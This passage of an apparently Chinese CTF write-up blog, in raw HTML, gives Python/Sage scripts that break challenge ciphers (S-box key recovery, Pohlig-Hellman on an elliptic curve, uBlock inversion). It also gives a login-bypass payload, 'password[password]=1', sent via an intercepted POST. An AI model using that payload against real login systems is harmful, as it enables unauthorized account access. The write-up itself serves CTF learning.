class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line">   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible0:</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)^b0</span><br><span class="line">    S_b0 = <span class="built_in">bin</span>(k^t0)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    S_b1 = <span class="built_in">bin</span>(k^tt0)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">0</span>]+S_b0[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result0 = <span class="built_in">bin</span>(Sbox0[x0][y0])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">0</span>]+S_b1[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result1 = <span class="built_in">bin</span>(Sbox0[x1][y1])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> result0 == <span class="built_in">bin</span>(P_bt1)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">0</span>:<span class="number">4</span>] <span class="keyword">and</span> result1 == <span class="built_in">bin</span>(P_bt2)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">0</span>:<span class="number">4</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(k)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible1:</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)^b1</span><br><span class="line">    S_b0 = <span class="built_in">bin</span>(k^t1)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    S_b1 = <span class="built_in">bin</span>(k^tt1)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">0</span>]+S_b0[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result0 = <span class="built_in">bin</span>(Sbox1[x0][y0])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">0</span>]+S_b1[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result1 = <span class="built_in">bin</span>(Sbox1[x1][y1])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> result0 == <span class="built_in">bin</span>(P_bt1)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">4</span>:<span class="number">8</span>] <span class="keyword">and</span> result1 == <span class="built_in">bin</span>(P_bt2)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">4</span>:<span class="number">8</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(k)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible2:</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)^b2</span><br><span class="line">    S_b0 = <span class="built_in">bin</span>(k^t2)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    S_b1 = <span class="built_in">bin</span>(k^tt2)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">0</span>]+S_b0[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result0 = <span class="built_in">bin</span>(Sbox2[x0][y0])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">0</span>]+S_b1[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result1 = <span class="built_in">bin</span>(Sbox2[x1][y1])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> result0 == <span class="built_in">bin</span>(P_bt1)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">8</span>:<span class="number">12</span>] <span class="keyword">and</span> result1 == <span class="built_in">bin</span>(P_bt2)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">8</span>:<span class="number">12</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(k)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible3:</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)^b3</span><br><span class="line">    S_b0 = <span class="built_in">bin</span>(k^t3)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    S_b1 = <span class="built_in">bin</span>(k^tt3)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">0</span>]+S_b0[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result0 = <span class="built_in">bin</span>(Sbox3[x0][y0])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">0</span>]+S_b1[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result1 = <span class="built_in">bin</span>(Sbox3[x1][y1])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> result0 == <span class="built_in">bin</span>(P_bt1)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">12</span>:<span class="number">16</span>] <span class="keyword">and</span> result1 == <span class="built_in">bin</span>(P_bt2)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">12</span>:<span class="number">16</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(k)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible4:</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)^b4</span><br><span class="line">    S_b0 = <span class="built_in">bin</span>(k^t4)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    S_b1 = <span class="built_in">bin</span>(k^tt4)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">0</span>]+S_b0[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result0 = <span class="built_in">bin</span>(Sbox4[x0][y0])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">0</span>]+S_b1[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result1 = <span class="built_in">bin</span>(Sbox4[x1][y1])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> result0 == <span class="built_in">bin</span>(P_bt1)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">16</span>:<span class="number">20</span>] <span class="keyword">and</span> result1 == <span class="built_in">bin</span>(P_bt2)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">16</span>:<span class="number">20</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(k)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible5:</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)^b5</span><br><span class="line">    S_b0 = <span class="built_in">bin</span>(k^t5)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    S_b1 = <span class="built_in">bin</span>(k^tt5)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">0</span>]+S_b0[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result0 = <span class="built_in">bin</span>(Sbox5[x0][y0])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">0</span>]+S_b1[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result1 = <span class="built_in">bin</span>(Sbox5[x1][y1])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> result0 == <span class="built_in">bin</span>(P_bt1)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">20</span>:<span class="number">24</span>] <span class="keyword">and</span> result1 == <span class="built_in">bin</span>(P_bt2)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">20</span>:<span class="number">24</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(k)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible6:</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)^b6</span><br><span class="line">    S_b0 = <span class="built_in">bin</span>(k^t6)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    S_b1 = <span class="built_in">bin</span>(k^tt6)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">0</span>]+S_b0[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result0 = <span class="built_in">bin</span>(Sbox6[x0][y0])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">0</span>]+S_b1[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result1 = <span class="built_in">bin</span>(Sbox6[x1][y1])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> result0 == <span class="built_in">bin</span>(P_bt1)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">24</span>:<span class="number">28</span>] <span class="keyword">and</span> result1 == <span class="built_in">bin</span>(P_bt2)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">24</span>:<span class="number">28</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(k)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible7:</span><br><span class="line">    k = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)^b7</span><br><span class="line">    S_b0 = <span class="built_in">bin</span>(k^t7)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    S_b1 = <span class="built_in">bin</span>(k^tt7)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">0</span>]+S_b0[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y0 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b0[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result0 = <span class="built_in">bin</span>(Sbox7[x0][y0])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">0</span>]+S_b1[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    y1 = <span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+S_b1[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">    result1 = <span class="built_in">bin</span>(Sbox7[x1][y1])[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> result0 == <span class="built_in">bin</span>(P_bt1)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">28</span>:<span class="number">32</span>] <span class="keyword">and</span> result1 == <span class="built_in">bin</span>(P_bt2)[<span class="number">2</span>:].zfill(<span class="number">32</span>)[<span class="number">28</span>:<span class="number">32</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(k)[<span class="number">2</span>:].zfill(<span class="number">6</span>))</span><br></pre></td></tr></table></figure>
<h3 id="fyh’s-gift"><a href="#fyh’s-gift" class="headerlink" title="fyh’s gift"></a>fyh’s gift</h3><p>考察Pohlig-Hellman攻击。<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/159893">https://www.anquanke.com/post/id/159893</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">secret_key, ciphertext</span>):</span><br><span class="line">    sha1 = hashlib.sha1()</span><br><span class="line">    sha1.update(<span class="built_in">str</span>(secret_key).encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    key = sha1.digest()[:<span class="number">16</span>]</span><br><span class="line">    iv = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    enc = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    flag = cipher.decrypt(enc).decode()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_shared_secret</span>(<span class="params">Q, n</span>):</span><br><span class="line">    <span class="keyword">return</span> (Q * n)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">&gt;&gt;sage:</span><br><span class="line">p = <span class="number">1227746669897024584176049601139983199725970765368150228682221</span> </span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">E = EllipticCurve(GF(p), [a,b])</span><br><span class="line">G = E.gens()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">c1 = E(<span class="number">302815835537564389018621724598932443372058309945965909258476</span>,<span class="number">101620440267876945129965564956309591452288432027338930366277</span>)</span><br><span class="line">c2 = E(<span class="number">65110746247642118366859050011022338368545596077949479875681</span>,<span class="number">1017598375305367769482826313607595483103330800029116590734900</span>)</span><br><span class="line">factor(G.order()) <span class="comment"># 幂因子填入数组primes*</span></span><br><span class="line">primes = [*]</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(G.order()) // <span class="built_in">int</span>(fac)</span><br><span class="line">    dlog = discrete_log(t*c2,t*G,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">    dlogs += [dlog]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(fac),<span class="built_in">str</span>(dlog)) <span class="comment"># 较大的因子爆不出来，舍弃</span></span><br><span class="line">key = crt(dlogs,primes)</span><br><span class="line">&gt;&gt;endsage</span><br><span class="line"></span><br><span class="line">shared_secret = gen_shared_secret(c1, key)</span><br><span class="line">ciphertext = <span class="string">&quot;da4ba62b1dbcdf0d8b3df8b4e253d7ef328c6a37a7d6569e9c2c577d683e1ba12d83828fdf2b2b390da5d05558f8dbcb0796ef874000f87486d679aa0c954a75&quot;</span></span><br><span class="line"><span class="built_in">print</span>(decrypt_flag(shared_secret,ciphertext))</span><br></pre></td></tr></table></figure>
<h3 id="Block"><a href="#Block" class="headerlink" title="Block?"></a>Block?</h3><p>查询PL，PR等关键词发现是uBlock加密，找到原论文中的解密过程和各个置换盒的逆盒，简单修改解密脚本使之可以执行明文攻击即可。<a target="_blank" rel="noopener" href="https://d.wanfangdata.com.cn/periodical/mmxb201906002">https://d.wanfangdata.com.cn/periodical/mmxb201906002</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line">s_1 = [<span class="number">0xc</span>,<span class="number">0xa</span>,<span class="number">0xe</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0xf</span>,<span class="number">0xb</span>,<span class="number">0x0</span>,<span class="number">0x7</span>,<span class="number">0x2</span>,<span class="number">0x5</span>,<span class="number">0x4</span>,<span class="number">0x3</span>,<span class="number">0x6</span>,<span class="number">0x9</span>,<span class="number">0x8</span>]</span><br><span class="line">PL1_1 = [<span class="number">4</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">6</span>]</span><br><span class="line">PR1_1 = [<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leftrow</span>(<span class="params">x, num</span>):</span><br><span class="line">    left = x &gt;&gt; <span class="number">32</span></span><br><span class="line">    right = x &amp; <span class="number">0xffffffff</span></span><br><span class="line">    l = ((left &lt;&lt; num) ^ (left &gt;&gt; <span class="number">32</span> - num)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    r = ((right &lt;&lt; num) ^ (right &gt;&gt; <span class="number">32</span> - num)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> (l &lt;&lt; <span class="number">32</span>) ^ r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">S_1</span>(<span class="params">x, bit</span>):</span><br><span class="line">    after_sbox = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bit):</span><br><span class="line">        after_sbox ^= (s_1[(x &gt;&gt; i * <span class="number">4</span>) &amp; <span class="number">0xf</span>] &lt;&lt; i * <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> after_sbox</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PL_1</span>(<span class="params">x</span>):</span><br><span class="line">    z = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        z.append((x &gt;&gt; (<span class="number">7</span> - i) * <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        res ^= (z[PL1_1[i]] &lt;&lt; (<span class="number">7</span> - i) * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PR_1</span>(<span class="params">x</span>):</span><br><span class="line">    z = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        z.append((x &gt;&gt; (<span class="number">7</span> - i) * <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        res ^= (z[PR1_1[i]] &lt;&lt; (<span class="number">7</span> - i) * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">x, c</span>):</span><br><span class="line">        x0, x1 = x &gt;&gt; <span class="number">64</span>, x &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        c0,c1 =  c &gt;&gt; <span class="number">64</span>, c &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        c0 = PL_1(c0)</span><br><span class="line">        c1 = PR_1(c1)</span><br><span class="line">        c0 = (c0^c1)&amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        c1 = (c1^leftrow(c0,<span class="number">20</span>))&amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        c0 = (c0^leftrow(c1,<span class="number">8</span>))&amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        c1 = (c1^leftrow(c0,<span class="number">8</span>))&amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        c0 = (c0^leftrow(c1,<span class="number">4</span>))&amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        c1 = (c1 ^ c0)&amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        c0 = S_1(c0,<span class="number">128</span>//<span class="number">8</span>)</span><br><span class="line">        c1 = S_1(c1,<span class="number">128</span>//<span class="number">8</span>)</span><br><span class="line">        rk0 = c0 ^ x0</span><br><span class="line">        rk1 = c1 ^ x1</span><br><span class="line">        k = (rk0 &lt;&lt; <span class="number">64</span>) ^ rk1</span><br><span class="line">        <span class="keyword">return</span> n2s(k)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = <span class="string">&quot;0x0123456789abcdeffedcba9876543210&quot;</span></span><br><span class="line">    ciphertext1 = <span class="string">&quot;0x16c95bd05e564b89e980dbf517d0f7c4&quot;</span></span><br><span class="line">    ciphertext2 = <span class="string">&quot;0xe4d1e2ccf953490de0e894b47efead9c&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(decrypt(<span class="built_in">int</span>(x,<span class="number">16</span>),<span class="built_in">int</span>(ciphertext1,<span class="number">16</span>))+decrypt(<span class="built_in">int</span>(x,<span class="number">16</span>),<span class="built_in">int</span>(ciphertext2,<span class="number">16</span>)))</span><br></pre></td></tr></table></figure>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="召唤神龙"><a href="#召唤神龙" class="headerlink" title="召唤神龙"></a>召唤神龙</h3><p>游戏题，打通关就行。将每一关玩家头上的字符拼起来即可得到flag。</p>
<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>打开题目场景得到一个login界面，下载附件得到环境部署代码和后端数据库。查看数据库发现只有一个用户，用户名为admin，密码为随机数生成的sha2值，因此无法通过代码审计和破解的手段得到密码，只能考虑sql注入并绕过登录界面。</p>
<p><img src="C:\Users\T14S\AppData\Roaming\Typora\typora-user-images\image-20220328130652020.png" alt="image-20220328130652020" style="zoom: 67%;" /></p>
<p>题目中提示了使用万能密码，因此最开始测试了几种常见的万能密码，但均未能绕过。于是卡住了。</p>
<p>后来询问出题人得到hint为类型注入，因此考虑是否输入的类型判断存在问题。查看数据库中username和password的类型为：</p>
<p><img src="C:\Users\T14S\AppData\Roaming\Typora\typora-user-images\image-20220328130723762.png" alt="image-20220328130723762" style="zoom: 67%;" /></p>
<p>发现要求传入字符串类型，但并未对输入做类型判断，因此猜想可以向数据库中注入一个含参对象。使用burpsuite抓取POST包，将payload改为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[password]=1</span><br></pre></td></tr></table></figure>
<p>发包发现服务器响应Found并重定向，证明绕过成功，关注重定向即可得到flag。</p>
<p><img src="C:\Users\T14S\AppData\Roaming\Typora\typora-user-images\image-20220328131038336.png" alt="image-20220328131038336" style="zoom: 80%;" /></p>
<h3 id="common-php"><a href="#common-php" class="headerlink" title="common_php"></a>common_php</h3><p>（感谢出题人hidden_er几乎是全程hint带我走了一遍这道题，对反序列化漏洞有了更深刻的认识）</p>
<p>进入题目环境，F12查看源码发现后端文件。</p>
<p><img src="C:\Users\T14S\AppData\Roaming\Typora\typora-user-images\image-20220328173904892.png" alt="image-20220328173904892"></p>
<p>修改url发现无法进入/dirsearchcantfindthisfile.php，猜测使用了界面跳转，使用burpsuite抓包得到源码，用html格式文件解析器打开。</p>
